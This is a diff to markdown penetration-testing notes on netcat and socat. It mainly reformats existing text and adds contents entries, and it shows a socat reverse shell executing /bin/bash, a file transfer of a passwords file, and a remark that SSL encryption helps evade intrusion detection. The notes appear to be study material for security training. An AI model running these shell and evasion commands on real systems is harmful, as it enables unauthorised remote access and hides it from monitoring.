@@ -11,7 +11,9 @@
     - [NetCat Bind Shell](#netcat-bind-shell)
     - [NetCat Reverse Shell](#netcat-reverse-shell)
  5. [Socat](#socat)
- 6. [Netcat vs Socat](#netcat-vs-socat)
+    - [Netcat vs Socat](#netcat-vs-socat)
+    - [Socat File Transfers](#socat-file-transfers)
+    - [Socat Encrypt Bind Shells](#socat-encrypt-bind-shells)
 
 
 ## Managing process
@@ -196,19 +198,21 @@ Alice need to send Bob
  ```
  - On Windows
      - ```bash
-     socat TCP4:10.11.0.4.:443 file:received_secret_passwords.txt,create
-     ```
+        socat TCP4:10.11.0.4.:443 file:received_secret_passwords.txt,create
+       ```
 ---
 ## Socat Reverse Shells
 - On window
-```bash
+  ```bash
     socat -d TCP4-LISTEN:443 STDOUT
-```
+  ```
 - On Linux
-```bash
+  ```bash
     socat TCP4:127.0.0.1:443 EXEC:/bin/bash
-```
+  ```
+  
 ## Socat Encrypt Bind Shells
+
 _Note:- Secure Socket Layer certificates. 
 This level of encryption will assist in evading intrusion detection system(IDS) and will help hide the sensitive data we are transceiving._
 ![](https://i.imgur.com/rJRoHmo.png)
